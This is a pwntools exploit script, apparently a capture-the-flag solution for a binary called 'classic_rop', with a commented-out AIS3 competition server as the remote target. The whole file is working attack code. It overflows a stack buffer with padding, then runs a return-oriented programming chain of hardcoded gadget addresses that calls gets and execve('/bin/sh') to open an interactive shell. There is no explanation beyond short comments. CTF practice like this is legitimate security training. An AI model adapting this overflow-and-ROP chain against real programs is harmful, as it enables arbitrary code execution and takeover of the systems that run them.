from pwn import *

context.arch = 'amd64'

#r = remote('mf-pwn.ais3.org', 10104)
r = process('./classic_rop')
gdb.attach(r)

string_address = 0x7fffffffdc60
return_address = 0x7fffffffdc78

gets = 0x410270
syscall = 0x474ec5
pop_rdi = 0x400686
pop_rsi = 0x4100d3
pop_rdx = 0x449915
pop_rax = 0x4156f4
buf = 0x6b6070 # any empty place where can write


"""
rop = flat(
# call read
    pop_rdi,
    0,       #fd
    pop_rsi,
    buf,     #buffer
    pop_rdx,
    8,       #count
    pop_rax,
    0,
    syscall,

# call execve (rax 59)
    pop_rax,
    59,
    pop_rdi,
    buf,     #filename
    pop_rsi,
    0,       #argv
    pop_rdx,
    0,       #envp
    syscall
)

r.recvline()
r.sendline(b'A' * (return_address - string_address) + rop)
r.send('/bin/sh\x00')"""


rop = flat(
# call gets (rax 0)
    pop_rdi,
    buf,     #buffer
    pop_rax,
    0,
    gets,

# call execve (rax 59)
    pop_rax,
    59,
    pop_rdi,
    buf,     #filename
    pop_rsi,
    0,       #argv
    pop_rdx,
    0,       #envp
    syscall
)

r.recvline()
r.sendline(b'A' * (return_address - string_address) + rop)
r.send('/bin/sh\x00')


r.interactive()
